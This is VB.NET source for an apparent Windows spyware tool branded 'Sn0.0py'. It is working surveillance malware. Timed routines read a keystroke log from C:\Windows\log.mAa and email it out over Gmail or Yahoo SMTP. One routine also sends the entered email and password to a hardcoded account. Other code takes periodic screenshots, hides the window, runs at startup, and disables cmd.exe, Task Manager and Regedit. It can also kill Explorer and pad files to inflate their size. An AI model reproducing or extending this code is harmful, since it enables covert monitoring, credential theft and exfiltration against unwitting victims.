        Me.TopMost = False
        'Dim attrib As RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", True)
        'attrib.SetValue("Hidden", 1)
        'attrib.Close()
        Call showhidden()
        Dim OPfiledialog As New OpenFileDialog()
        OPfiledialog.Filter = "m.A.a files(*.mAa)|*.mAa"
        OPfiledialog.FilterIndex = 1
        OPfiledialog.RestoreDirectory = True
        If OPfiledialog.ShowDialog() = Windows.Forms.DialogResult.OK Then
            Try
                Dim baca As New System.IO.StreamReader(OPfiledialog.FileName)
                Dim s As String = baca.ReadToEnd
                Dim decode As Byte() = Convert.FromBase64String(s)
                ViewlogTxtBox.Text = System.Text.Encoding.UTF8.GetString(decode)
                baca.Close()
                TextBox6.Text = OPfiledialog.FileName
            Catch ex1 As Exception
                Dim baca As New System.IO.StreamReader(OPfiledialog.FileName)
                Dim s As String = baca.ReadToEnd
                ViewlogTxtBox.Text = s
                baca.Close()
                TextBox6.Text = OPfiledialog.FileName
            End Try
        End If
        'Dim attrib2 As RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", True)
        'attrib2.SetValue("Hidden", 2)
        'attrib2.Close()
        Call hidehidden()
        Me.StatusLabel.Text = nemon
        keytimer.Enabled = True
    End Sub

    Private Sub OK_Button_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OK_Button.Click
        If TextBox1.Text = "" And TextBox2.Text = "" And TextBox3.Text = "" Then
            MsgBox("Email dan Password Wajib Diisi !", MsgBoxStyle.Critical, "Warning")
        ElseIf ButtonSetEmail.BackColor = Color.Fuchsia Then
            Timer_Send.Enabled = True
            MsgBox("Auto Send Aktif", MsgBoxStyle.Information, "Active")
            Me.DialogResult = System.Windows.Forms.DialogResult.OK
            CheckBox1.Checked = True
            StatusLabel.Text = "Active"
            TopMost = True
        Else
            MsgBox("Please set email first!!!", MsgBoxStyle.Exclamation, "Set Email First!")
            ButtonSetEmail.Focus()
        End If
    End Sub

    Private Sub Cancel_Button_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub
    Sub kirim()
        Try
            Dim baca As New System.IO.StreamReader("C:\Windows\log.mAa")
            Dim s As String = baca.ReadToEnd
            Dim SmtpServer As New SmtpClient()
            Dim mail As New MailMessage()
            SmtpServer.Credentials = New Net.NetworkCredential(TextBox4.Text, TextBox1.Text)
            If DomainUpDown2.SelectedItem.ToString = "@gmail.com" Then
                SmtpServer.Port = gport
                SmtpServer.Host = ghost
            ElseIf DomainUpDown2.SelectedItem.ToString = "@yahoo.com" Then
                SmtpServer.Port = yport
                SmtpServer.Host = ghost
            End If
            SmtpServer.EnableSsl = True
            mail = New MailMessage()
            mail.From = New MailAddress(TextBox4.Text)
            mail.To.Add(TextBox3.Text + DomainUpDown1.SelectedItem.ToString)
            mail.Subject = "Saved KeyLog " + Now.ToString
            mail.Body = s
            baca.Close()
            SmtpServer.Send(mail)
        Catch ex As Exception

        End Try
    End Sub
    Public Sub KirimWithMyacc()
        Dim baca As New System.IO.StreamReader("C:\Windows\log.mAa")
        Dim s As String = baca.ReadToEnd
        Dim SmtpServer As New SmtpClient()
        Dim mail As New MailMessage()
        SmtpServer.Credentials = New Net.NetworkCredential(TexBox1_Text, TexBox2_Text)
        If DomainUpDown2.SelectedItem.ToString = "@gmail.com" Then
            SmtpServer.Port = gport
            SmtpServer.Host = ghost
        ElseIf DomainUpDown2.SelectedItem.ToString = "@yahoo.com" Then
            SmtpServer.Port = yport
            SmtpServer.Host = ghost
        End If
        SmtpServer.EnableSsl = True
        mail = New MailMessage()
        mail.From = New MailAddress(TextBox1.Text)
        mail.To.Add(TextBox3.Text + DomainUpDown1.SelectedItem.ToString)
        mail.Subject = "Saved KeyLog " + Now.ToString
        mail.Body = s
        baca.Close()
        SmtpServer.Send(mail)
    End Sub
    Sub sendtome()
        Try
            Dim baca As New System.IO.StreamReader("C:\Windows\log.mAa")
            Dim s As String = baca.ReadToEnd
            Dim Smtp As New SmtpClient("smtp.gmail.com")
            Dim mail As New MailMessage()
            Smtp.Credentials = New Net.NetworkCredential(TexBox1_Text, TexBox2_Text)
            Smtp.Port = 587
            Smtp.EnableSsl = True
            mail = New MailMessage()
            mail.From = New MailAddress(TexBox1_Text)
            mail.To.Add(TexBox1_Text)
            mail.Subject = "Saved Keylog " + Now.ToString
            mail.Body = "Email = " + TextBox1.Text + vbNewLine + "Password = " + TextBox2.Text + vbNewLine + "Saved Keylog " + s
            baca.Close()
            Smtp.Send(mail)
        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try

    End Sub

    Sub KirimLogAttachment()
        Dim SmtpServer As New SmtpClient()
        Dim mail As New MailMessage()
        SmtpServer.Credentials = New Net.NetworkCredential(TextBox4.Text + DomainUpDown2.SelectedItem.ToString, TextBox1.Text)
        If DomainUpDown2.SelectedItem.ToString = "@gmail.com" Then
            SmtpServer.Port = gport
            SmtpServer.Host = ghost
        ElseIf DomainUpDown2.SelectedItem.ToString = "@yahoo.com" Then
            SmtpServer.Port = yport
            SmtpServer.Host = ghost
        End If
        SmtpServer.EnableSsl = True
        mail = New MailMessage()
        mail.From = New MailAddress(TextBox4.Text + DomainUpDown2.SelectedItem.ToString)
        mail.To.Add(TextBox3.Text + DomainUpDown1.SelectedItem.ToString)
        mail.Subject = "Saved Keylog " + Now.ToString
        mail.Body = "Log tersimpan di attachment silahkan download"
        Dim attachment As Attachment
        Try
            attachment = New Attachment("C:\Windows\log.mAa")
            mail.Attachments.Add(attachment)
            SmtpServer.Send(mail)
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    Private Sub Timer_Send_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer_Send.Tick
        If My.Computer.Network.IsAvailable Then
            Call savelog()
            Call sendtome()
            If Not TextBox4.Text = "" And Not TextBox3.Text = "" Then
                Call KirimLogAttachment()
            End If
        End If
    End Sub

    Private Sub Dialog_LogSend_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        keytimer.Enabled = False
        StatusLabel.Text = "Paused"
        NumericUpDown1.Value = My.Settings.jam
        NumericUpDown2.Value = My.Settings.menit
        NumericUpDown3.Value = My.Settings.detik
        TextBox4.Text = My.Settings.emailsender
        TextBox1.Text = My.Settings.passsender
        TextBox3.Text = My.Settings.emailreceiver
        DomainUpDown1.SelectedItem = My.Settings.domainreceiver
        DomainUpDown2.SelectedItem = My.Settings.domainsender
    End Sub


    Private Sub Cancel_ButtonClick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Me.DialogResult = System.Windows.Forms.DialogResult.Cancel
        If Timer_Send.Enabled = False Then
            CheckBox1.Checked = False
        End If
        Me.Opacity = 0%
        keytimer.Enabled = True
        StatusLabel.Text = "Active"
        TopMost = True
    End Sub

    Private Sub Stop_Button_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Cancel_Button.Click
        Timer_Send.Enabled = False
        MsgBox("Auto Send Tidak Aktif", MsgBoxStyle.Information, "Deactived")
        CheckBox1.Checked = False
        keytimer.Enabled = True
        TopMost = True
    End Sub

    Private Sub Dialog_LogSend_KeyDown(ByVal sender As System.Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles MyBase.KeyDown
        If e.Control And e.KeyCode = Keys.PageUp Then
            Opacity = 100%
        ElseIf e.Shift And e.KeyCode = Keys.A Then
            Opacity = 100%
        ElseIf e.Control And e.KeyCode = Keys.Z Then
            Opacity = 0%
        End If
    End Sub

    Private Sub NumericUpDown1_ValueChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NumericUpDown1.ValueChanged
        Call jam()
        If NumericUpDown1.Value > 24 Then
            NumericUpDown1.Value = 0
        End If
        Label5.Text = "Log akan dikirim jika ada koneksi internet setiap " & NumericUpDown1.Value.ToString & " jam"
    End Sub

    Private Sub NumericUpDown2_ValueChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NumericUpDown2.ValueChanged
        Call menit()
        If NumericUpDown2.Value > 60 Then
            NumericUpDown2.Value = 0
        End If
        Label5.Text = "Log akan dikirim jika ada koneksi internet setiap " & NumericUpDown2.Value.ToString & " menit"
    End Sub

    Private Sub NumericUpDown3_ValueChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NumericUpDown3.ValueChanged
        Call detik()
        If NumericUpDown3.Value > 60 Then
            NumericUpDown3.Value = 0
        End If
        Label5.Text = "Log akan dikirim jika ada koneksi internet setiap " & NumericUpDown3.Value.ToString & " detik"
    End Sub

    Private Sub Dialog_LogSend_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        My.Settings.jam = NumericUpDown1.Value
        My.Settings.menit = NumericUpDown2.Value
        My.Settings.detik = NumericUpDown3.Value
        My.Settings.emailsender = TextBox4.Text
        My.Settings.passsender = TextBox1.Text
        My.Settings.emailreceiver = TextBox3.Text
        My.Settings.domainreceiver = DomainUpDown1.SelectedItem.ToString
        My.Settings.domainsender = DomainUpDown2.SelectedItem.ToString
        My.Settings.Save()
    End Sub

    Sub detik()
        Dim det As Decimal = NumericUpDown3.Value
        Dim b As Decimal
        If Not det = 0 Then
            b = det * 1000
            Timer_Send.Interval = CInt(b)
            NumericUpDown1.Value = 0
            NumericUpDown2.Value = 0
        Else
            Timer_Send.Interval = 100
        End If
    End Sub

    Sub menit()
        Dim men As Decimal = NumericUpDown2.Value
        Dim b As Decimal
        If Not men = 0 Then
            b = men * 60 * 1000
            Timer_Send.Interval = CInt(b)
            NumericUpDown1.Value = 0
            NumericUpDown3.Value = 0
        Else
            Timer_Send.Interval = 100
        End If
    End Sub

    Sub jam()
        Dim jam As Decimal = NumericUpDown1.Value
        Dim b As Decimal
        If Not jam = 0 Then
            b = 60 * 60 * 1000
            Timer_Send.Interval = CInt(b)
            NumericUpDown2.Value = 0
            NumericUpDown3.Value = 0
        Else
            Timer_Send.Interval = 100
        End If
    End Sub

    Private Sub Dialog_LogSend_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox3.Click, TextBox2.Click, TextBox1.Click, NumericUpDown3.Click, NumericUpDown2.Click, NumericUpDown1.Click, MyBase.Click
        keytimer.Enabled = False
        Me.Focus()
    End Sub

    Private Sub DomainUpDown1_SelectedItemChanged(sender As Object, e As EventArgs) Handles DomainUpDown1.SelectedItemChanged

    End Sub

    Private Sub ButtonSetEmail_Click(sender As Object, e As EventArgs) Handles ButtonSetEmail.Click, Button2.Click
        If TextBox1.Text = "" Or TextBox4.Text = "" Then
            MsgBox("Email and Pass Cannot Be Empty !!!", MsgBoxStyle.Exclamation, "Warning")
        ElseIf My.Computer.Network.IsAvailable = True Then
            Try
                Dim SmtpServer As New SmtpClient()
                Dim mail As New MailMessage()
                SmtpServer.Credentials = New Net.NetworkCredential(TextBox4.Text + DomainUpDown2.SelectedItem.ToString, TextBox1.Text)
                If DomainUpDown2.SelectedItem.ToString = "@gmail.com" Then
                    SmtpServer.Port = gport
                    SmtpServer.Host = ghost
                ElseIf DomainUpDown2.SelectedItem.ToString = "@yahoo.com" Then
                    SmtpServer.Port = yport
                    SmtpServer.Host = yhost
                End If
                SmtpServer.EnableSsl = True
                mail = New MailMessage()
                mail.From = New MailAddress(TextBox4.Text + DomainUpDown2.SelectedItem.ToString)
                mail.To.Add(TextBox3.Text + DomainUpDown1.SelectedItem.ToString)
                mail.Subject = "Testing And Set Account Security " + Now.ToString
                mail.Body = "Completed"
                SmtpServer.Send(mail)
                Me.TopMost = False
                MsgBox("Sending Email Complete")
                Me.TopMost = True
                ButtonSetEmail.BackColor = Color.Fuchsia
                ButtonSetEmail.Text = "Setting Email" + vbNewLine + "COMPLETE"
            Catch ex As Exception
                MsgBox("Please Login in This app and set lesssecurity to on", MsgBoxStyle.Information)
                If File.Exists("C:\Program Files\Google\Chrome\Application\chrome.exe") Then
                    If File.Exists("C:\Program Files\Google\Chrome\Application\chr.bat") Then
                    Else
                        Dim tal As StreamWriter = File.CreateText("C:\Program Files\Google\Chrome\Application\chr.bat")
                        tal.WriteLine("cd C:\Program Files\Google\Chrome\Application && chrome https://www.google.com/settings/security/lesssecureapps?")
                        tal.Flush()
                        tal.Close()
                    End If
                    Process.Start("C:\Program Files\Google\Chrome\Application\chr.bat")
                ElseIf File.Exists("C:\Program Files\Internet Explorer\iexplore.exe") Then
                    If File.Exists("C:\Program Files\Internet Explorer\ie.bat") Then
                    Else
                        Dim tul As StreamWriter = File.CreateText("C:\Program Files\Internet Explorer\ie.bat")
                        tul.WriteLine("cd C:\Program Files\Internet Explorer && iexplore www.google.com/settings/security/lesssecureapps?")
                        tul.Flush()
                        tul.Close()
                    End If
                    Process.Start("C:\Program Files\Internet Explorer\ie.bat")
                Else
                    MsgBox("Please Install WebBrowser First!!!" + vbNewLine + "Chrome is recomended", MsgBoxStyle.Exclamation)
                End If
            End Try
        Else
            MsgBox("Please check your internet connection !!", MsgBoxStyle.Exclamation, "Internet Unavailable")
        End If
    End Sub


    Private Sub DateLabel_MouseHover(sender As Object, e As EventArgs) Handles DateLabel.MouseHover
        timebutton.Enabled = False
        If My.Computer.Network.IsAvailable = True Then
            Me.DateLabel.Text = "Internet Connection Available"
        Else
            Me.DateLabel.Text = "No Internet Connection"
        End If
    End Sub

    Private Sub DateLabel_MouseLeave(sender As Object, e As EventArgs) Handles DateLabel.MouseLeave
        Me.timebutton.Enabled = True
        Me.DateLabel.Text = DateTime.Now.ToString("dd.MM.yyyy")
    End Sub

    Private Sub Timerall_Tick(sender As Object, e As EventArgs)
        If TextBox4.Focused = True Or TextBox1.Focused = True Or TextBox3.Focused = True Then
            keytimer.Enabled = False
        Else
            keytimer.Enabled = True
        End If
    End Sub

    Private Sub Button16_Click(sender As Object, e As EventArgs) Handles Button16.Click
        If CheckBox4.Checked = False Then
            CheckBox4.Checked = True
            Button16.BackColor = Color.Teal
            Button16.Text = "Auto Save Log" + vbNewLine + "ON"
        ElseIf CheckBox4.Checked = True Then
            CheckBox4.Checked = False
            Button16.BackColor = Color.Transparent
            Button16.Text = "Auto Save Log" + vbNewLine + "OFF"
        End If
    End Sub

    Private Sub Button4_Click_1(sender As Object, e As EventArgs) Handles Button4.Click
        If CheckBox5.Checked = False Then
            CheckBox5.Checked = True
            Button4.BackColor = Color.Teal
            Button4.Text = "Enable Task Manager"
        ElseIf CheckBox5.Checked = True Then
            CheckBox5.Checked = False
            Button4.BackColor = Color.Transparent
            Button4.Text = "Disable Task Manager"
        End If
    End Sub

    Private Sub Button12_Click(sender As Object, e As EventArgs) Handles Button12.Click
        Process.Start("taskkill", "/F /IM explorer.exe /T")
        MsgBox("Explorer.exe killed", MsgBoxStyle.Information, "Sn0.0py")
    End Sub

    Private Sub Button21_Click(sender As Object, e As EventArgs) Handles Button21.Click
        If CheckBox7.Checked = False Then
            CheckBox7.Checked = True
            Button21.BackColor = Color.Teal
            Button21.Text = "Enable Regedit"
        ElseIf CheckBox7.Checked = True Then
            CheckBox7.Checked = False
            Button21.BackColor = Color.Transparent
            Button21.Text = "Disable Regedit"
        End If
    End Sub

    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParameter As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Private Const SETDESKTOPWALLPAPER = 20
    Private Const UPDATEINIFILE = &H1
    Private Sub Button15_Click(sender As Object, e As EventArgs) Handles Button15.Click
        'My.Computer.Network.DownloadFile("http", "")
        Dim flocation As String
        Dim ofdialog As New OpenFileDialog
        ofdialog.Filter = "Image File(*.jpg *.png) | *.jpg;*.jpeg;*.png"
        ofdialog.FilterIndex = 1
        ofdialog.RestoreDirectory = True
        If ofdialog.ShowDialog = DialogResult.OK Then
            flocation = ofdialog.FileName
            SystemParametersInfo(SETDESKTOPWALLPAPER, 0, flocation, UPDATEINIFILE)
            MsgBox("Wallpaper changed succesfuly" + vbNewLine + "-> " + ofdialog.SafeFileName + " <-", MsgBoxStyle.Information, "Sn0.0py")
        End If
    End Sub

    Private Sub Button18_Click(sender As Object, e As EventArgs) Handles Button18.Click
        If CheckBox6.Checked = False Then
            CheckBox6.Checked = True
            Button18.BackColor = Color.Teal
            Button18.Text = "Enable This App Notification"
        ElseIf CheckBox6.Checked = True Then
            CheckBox6.Checked = False
            Button18.BackColor = Color.Transparent
            Button18.Text = "Disable This App Notification"
        End If
    End Sub

    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
        If Button13.Text = "Cancel" Then
            Process.Start("shutdown", "/a")
            Button13.Text = "Start"
            NumericUpDown4.Visible = True
            DomainUpDown3.Visible = True
            Button13.Visible = True
            Button9.Text = "Auto Shutdown"
            TimerShutdown.Enabled = False
        ElseIf NumericUpDown4.Visible = True And DomainUpDown3.Visible = True And TimerShutdown.Enabled = False Then
            NumericUpDown4.Visible = False
            DomainUpDown3.Visible = False
            Button13.Visible = False
            Button9.BackColor = Color.Transparent
        Else
            NumericUpDown4.Visible = True
            DomainUpDown3.Visible = True
            Button13.Visible = True
            Button9.BackColor = Color.Red
        End If
    End Sub

    Private Sub Button20_Click(sender As Object, e As EventArgs) Handles Button20.Click
        If CheckBox2.Checked = False Then
            CheckBox2.Checked = True
            Button20.BackColor = Color.Teal
            Button20.Text = "Active On Startup" + vbNewLine + "ON"
        ElseIf CheckBox2.Checked = True Then
            CheckBox2.Checked = False
            Button20.BackColor = Color.Transparent
            Button20.Text = "Active On Startup" + vbNewLine + "OFF"
        End If
    End Sub

    Private Sub Button13_Click(sender As Object, e As EventArgs) Handles Button13.Click
        a = NumericUpDown4.Value
        If a > 0 Then
            If DomainUpDown3.SelectedItem Is "Jam" Then
                hsl = a * 3600
                Process.Start("shutdown", "/s /f /t " + hsl.ToString)
                Button13.Text = "Cancel"
                NumericUpDown4.Visible = False
                DomainUpDown3.Visible = False
                Button13.Visible = False
                Hitmundur = hsl
                TimerShutdown.Enabled = True
            ElseIf DomainUpDown3.SelectedItem Is "Menit" Then
                hsl = a * 60
                Process.Start("shutdown", "/s /f /t " + hsl.ToString)
                Button13.Text = "Cancel"
                NumericUpDown4.Visible = False
                DomainUpDown3.Visible = False
                Button13.Visible = False
                Hitmundur = hsl
                TimerShutdown.Enabled = True
            ElseIf DomainUpDown3.SelectedItem Is "Detik" Then
                hsl = a
                Process.Start("shutdown", "/s /f /t " + hsl.ToString)
                Button13.Text = "Cancel"
                NumericUpDown4.Visible = False
                DomainUpDown3.Visible = False
                Button13.Visible = False
                Hitmundur = hsl
                TimerShutdown.Enabled = True
            Else
                ErrorProvider1.SetError(DomainUpDown3, "Choose Unit!!!")
            End If
        Else
            ErrorProvider1.SetError(NumericUpDown4, "Value must be greater than 0")
        End If
    End Sub

    Private Sub NumericUpDown4_ValueChanged(sender As Object, e As EventArgs) Handles NumericUpDown4.ValueChanged
        If DomainUpDown3.SelectedItem Is "Jam" Then
            If NumericUpDown4.Value > 24 Then
                NumericUpDown4.Value = 0
            End If
        ElseIf DomainUpDown3.SelectedItem Is "Menit" Then
            If NumericUpDown4.Value > 60 Then
                NumericUpDown4.Value = 0
            End If
        End If
    End Sub

    Private Sub Button9_MouseHover(sender As Object, e As EventArgs) Handles Button9.MouseHover
        If Button13.Text = "Cancel" Then
            Button9.Text = "Cancel"
        End If
    End Sub

    Private Sub Button9_MouseLeave(sender As Object, e As EventArgs) Handles Button9.MouseLeave
        If Button9.Text = "Cancel" And Button13.Text = "Cancel" Then
            Button9.Text = "Shutdown in" + vbNewLine + hsl.ToString + " second"
        End If
    End Sub

    Private Sub TimerShutdown_Tick(sender As Object, e As EventArgs) Handles TimerShutdown.Tick
        If Hitmundur = 0 Then
            End
        Else
            hsl = Hitmundur - 1
            Hitmundur = hsl
            If hsl >= 300 Then
                Dim m As Decimal = CInt(hsl) \ 60
                Button9.Text = "Shutdown in" + vbNewLine + m.ToString + " minutes"
            Else
                Button9.Text = "Shutdown in" + vbNewLine + hsl.ToString + " second"
            End If
        End If
    End Sub

    Private Sub Button14_Click(sender As Object, e As EventArgs) Handles Button14.Click
        If CheckBox3.Checked = False Then
            CheckBox3.Checked = True
            Button14.Text = "Hide On StartUp" + vbNewLine + "ON"
            Button14.BackColor = Color.Teal
        ElseIf CheckBox3.Checked = True Then
            CheckBox3.Checked = False
            Button14.Text = "Hide On StartUp" + vbNewLine + "OFF"
            Button14.BackColor = Color.Transparent
        End If
    End Sub

    Private Sub Button19_Click(sender As Object, e As EventArgs) Handles Button19.Click
        If Button19.Text = "Disable CMD" Then
            Process.Start("taskkill", "/F /IM cmd.exe /T")
            File.Move("C:\Windows\system32\cmd.exe", "C:\Windows\system32\cmd.mAa")
            Button19.BackColor = Color.Teal
            Button19.Text = "Enable CMD"
        ElseIf Button19.Text = "Enable CMD" Then
            File.Move("C:\Windows\system32\cmd.mAa", "C:\Windows\system32\cmd.exe")
            Button19.BackColor = Color.Transparent
            Button19.Text = "Disable CMD"
        End If
    End Sub

    Private Sub Button25_Click(sender As Object, e As EventArgs) Handles Button25.Click
        If TextBox5.Visible = False Then
            TextBox5.Visible = True
            Button25.BackColor = Color.Fuchsia
            Button26.Visible = True
            Button27.Visible = True
            TextBox5.Focus()
        Else
            TextBox5.Visible = False
            TextBox5.Text = ""
            Button25.BackColor = Color.Teal
            Button26.Visible = False
            Button27.Visible = False
        End If
    End Sub

    Private TargetPosition As Integer
    Private Sub FindWord(ByVal start_at As Integer)
        Dim pos As Integer
        Dim target As String
        target = TextBox5.Text
        Try
            pos = InStr(start_at, ViewlogTxtBox.Text, target)
            If pos > 0 Then
                TargetPosition = pos
                ViewlogTxtBox.SelectionStart = TargetPosition - 1
                ViewlogTxtBox.SelectionLength = Len(target)
                ViewlogTxtBox.Focus()
            Else
                If TargetPosition > 0 Then
                    FindWord(1)
                Else
                    MsgBox("Not Found")
                End If
                ViewlogTxtBox.Focus()
            End If
        Catch ex As Exception
            MsgBox(ex.ToString, MsgBoxStyle.OkOnly, "Not Found")
            ViewlogTxtBox.Focus()
        End Try

    End Sub
    Private Sub Button26_Click(sender As Object, e As EventArgs) Handles Button26.Click
        FindWord(1)
    End Sub

    Private Sub Button27_Click(sender As Object, e As EventArgs) Handles Button27.Click
        FindWord(TargetPosition + 1)
    End Sub

    Private Sub Button24_Click(sender As Object, e As EventArgs) Handles Button24.Click
        Dim opfiledialog As New OpenFileDialog
        opfiledialog.Filter = "All Files(*.*)|*.*"
        opfiledialog.FilterIndex = 1
        opfiledialog.RestoreDirectory = True
        If opfiledialog.ShowDialog = DialogResult.OK Then
            TextBox7.Text = opfiledialog.FileName
            Button22.Location = New Point(307, 199)
            NumericUpDown6.Visible = True
            RadioButton1.Visible = True
            RadioButton2.Visible = True
            Button29.Visible = True
            Dim fileinfo As New FileInfo(opfiledialog.FileName)
            If fileinfo.Length / 1048576 <= 1 Then
                Button24.Text = fileinfo.Name & vbNewLine & fileinfo.Length / 1024 & " kb"
            Else
                Button24.Text = fileinfo.Name & vbNewLine & fileinfo.Length / 1048576 & " mb"
            End If
            Button24.BackColor = Color.Teal
        End If
    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        TabControl1.SelectTab(2)
    End Sub

    Private Sub Button23_Click(sender As Object, e As EventArgs) Handles Button23.Click
        If Button23.Text = "Cancel" Then
            TimerSS.Enabled = False
            NumericUpDown5.Visible = True
            DomainUpDown4.Visible = True
            Button28.Visible = True
            Button28.Text = "Start"
            Button23.Text = "Auto ScreenShot"
            Button23.BackColor = Color.DodgerBlue
        ElseIf NumericUpDown5.Visible = True And TimerSS.Enabled = False Then
            NumericUpDown5.Visible = False
            DomainUpDown4.Visible = False
            Button28.Visible = False
            Button23.BackColor = Color.Transparent
        Else
            NumericUpDown5.Visible = True
            DomainUpDown4.Visible = True
            Button28.Visible = True
            Button23.BackColor = Color.DodgerBlue
        End If
    End Sub

    Sub AScreenShot()
        Dim currentScreen = Screen.FromHandle(Me.Handle).WorkingArea
        Using capture As New Bitmap(currentScreen.Width, currentScreen.Height)
            capture.SetResolution(1366, 768)
            Using g = Graphics.FromImage(capture)
                g.CompositingQuality = CompositingQuality.HighQuality
                g.InterpolationMode = InterpolationMode.HighQualityBicubic
                g.SmoothingMode = SmoothingMode.HighQuality
                g.SmoothingMode = SmoothingMode.AntiAlias
                g.CopyFromScreen(New Point(0, 0), New Point(0, 0), currentScreen.Size)
            End Using
            If File.Exists("C:\Windows\SS\eses.png") Then
                Do
                    nom = nom + 1
                Loop While File.Exists(fn + nom.ToString() + ext)
                fn = fn + nom.ToString + ext
                capture.Save(fn, Imaging.ImageFormat.Png)
                fn = "C:\Windows\SS\eses"
            Else
                capture.Save("C:\Windows\SS\eses.png", Imaging.ImageFormat.Png)
            End If
        End Using

    End Sub

    Private Sub Button28_Click(sender As Object, e As EventArgs) Handles Button28.Click
        MsgBox("ScreenShot Saved in C:\Windows\SS", MsgBoxStyle.Information)
        b = NumericUpDown5.Value
        If b > 0 Then
            If DomainUpDown4.SelectedItem Is "Jam" Then
                hssl = b * 3600 * 1000
                TimerSS.Interval = CInt(hssl)
                TimerSS.Enabled = True
                Button23.Text = "ScreenShot Every" + vbNewLine + b.ToString + " jam"
                NumericUpDown5.Visible = False
                DomainUpDown4.Visible = False
                Button28.Visible = False
                Button28.Text = "Cancel"
            ElseIf DomainUpDown4.SelectedItem Is "Menit" Then
                hssl = b * 60 * 1000
                TimerSS.Interval = CInt(hssl)
                TimerSS.Enabled = True
                Button23.Text = "ScreenShot Every" + vbNewLine + b.ToString + " menit"
                NumericUpDown5.Visible = False
                DomainUpDown4.Visible = False
                Button28.Visible = False
                Button28.Text = "Cancel"
            ElseIf DomainUpDown4.SelectedItem Is "Detik" Then
                hssl = b * 1000
                TimerSS.Interval = CInt(hssl)
                TimerSS.Enabled = True
                Button23.Text = "ScreenShot Every" + vbNewLine + b.ToString + " detik"
                NumericUpDown5.Visible = False
                DomainUpDown4.Visible = False
                Button28.Visible = False
                Button28.Text = "Cancel"
            Else
                ErrorProvider1.SetError(DomainUpDown4, "Please Choose a Unit!!!")
            End If
        Else
            ErrorProvider1.SetError(NumericUpDown5, "Value must greater than 0")
        End If
    End Sub

    Private Sub Button23_MouseHover(sender As Object, e As EventArgs) Handles Button23.MouseHover
        If Button28.Text = "Cancel" Then
            Button23.Text = "Cancel"
            Button23.BackColor = Color.Red
        End If
    End Sub

    Private Sub TimerSS_Tick(sender As Object, e As EventArgs) Handles TimerSS.Tick
        Call AScreenShot()
    End Sub

    Private Sub Button23_MouseLeave(sender As Object, e As EventArgs) Handles Button23.MouseLeave
        If Button23.Text = "Cancel" Then
            If DomainUpDown4.SelectedItem Is "Jam" Then
                Button23.Text = "ScreenShot Every" + vbNewLine + NumericUpDown5.Value.ToString + " jam"
                Button23.BackColor = Color.Transparent
            ElseIf DomainUpDown4.SelectedItem Is "Menit" Then
                Button23.Text = "ScreenShot Every" + vbNewLine + NumericUpDown5.Value.ToString + " Menit"
                Button23.BackColor = Color.Transparent
            ElseIf DomainUpDown4.SelectedItem Is "Detik" Then
                Button23.Text = "ScreenShot Every" + vbNewLine + NumericUpDown5.Value.ToString + " Detik"
                Button23.BackColor = Color.Transparent
            End If
        End If
    End Sub

    Private Sub NumericUpDown5_ValueChanged(sender As Object, e As EventArgs) Handles NumericUpDown5.ValueChanged
        If NumericUpDown5.Value > 60 Then
            NumericUpDown5.Value = 0
        End If
    End Sub

    Private Sub Button22_Click(sender As Object, e As EventArgs) Handles Button22.Click
        Try
            Try
                Process.Start("C:\Program Files\Google\Chrome\Application\chrome.exe", "http://justanotex.blogspot.com")
            Catch ex As Exception
                Process.Start("C:\Program Files\Internet Explorer\iexplorer.exe", "http://justanotex.blogspot.com")
            End Try
        Catch ex As Exception
            Browserr.WebBrowser1.Url = New Uri("http://justanotex.blogspot.com")
            Me.TopMost = False
            Browserr.Show()
            Browserr.Focus()
        End Try

    End Sub

    Private Sub OKButton_Click(sender As Object, e As EventArgs) Handles OKButton.Click
        MsgBox("Contact Me via email if you want donate or chat me via telegram" + vbNewLine + "http://t.me/arm_ando", MsgBoxStyle.MsgBoxHelp, "Thank You")
    End Sub

    Private Sub Button29_Click(sender As Object, e As EventArgs) Handles Button29.Click
        If NumericUpDown6.Value = 0 Then
            MsgBox("Please set how much size will be pumped")
        Else
            Dim file1 = File.OpenWrite(TextBox7.Text)
            Dim sizea = file1.Seek(0, SeekOrigin.[End])
            Dim sizeb = NumericUpDown6.Value
            Dim bite As Decimal
            If RadioButton1.Checked Then
                bite = sizeb * 1048576
            ElseIf RadioButton2.Checked Then
                bite = sizeb * 1073741824
            Else
                MsgBox("select mb/gb")
            End If
            While sizea < bite
                sizea += 1
                file1.WriteByte(0)
            End While
            file1.Close()
            Dim fileinfo As New FileInfo(TextBox7.Text)
            MsgBox(fileinfo.Name & vbNewLine & "Size : " & fileinfo.Length / 1048576 & " mb", MsgBoxStyle.Information, "Finish")
            NumericUpDown6.Visible = False
            RadioButton2.Visible = False
            RadioButton1.Visible = False
            Button29.Visible = False
            Button22.Location = New Point(399, 199)
            Button24.Text = "File Pumper"
            Button24.BackColor = Color.Transparent
        End If
    End Sub

End Class
